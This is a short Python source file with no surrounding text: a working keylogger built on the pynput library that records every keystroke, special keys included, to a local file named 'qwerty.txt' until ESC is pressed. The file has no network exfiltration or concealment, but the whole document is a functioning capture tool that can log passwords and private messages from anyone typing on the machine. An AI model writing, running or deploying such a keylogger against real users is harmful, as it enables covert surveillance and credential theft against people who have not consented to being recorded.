from pynput import keyboard

# File where logs will be saved
log_file = "qwerty.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Regular character keys
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            # Handle special keys
            if key == keyboard.Key.space:
                f.write(" [SPACE] ")
            elif key == keyboard.Key.enter:
                f.write(" [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(" [TAB] ")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop the listener when ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
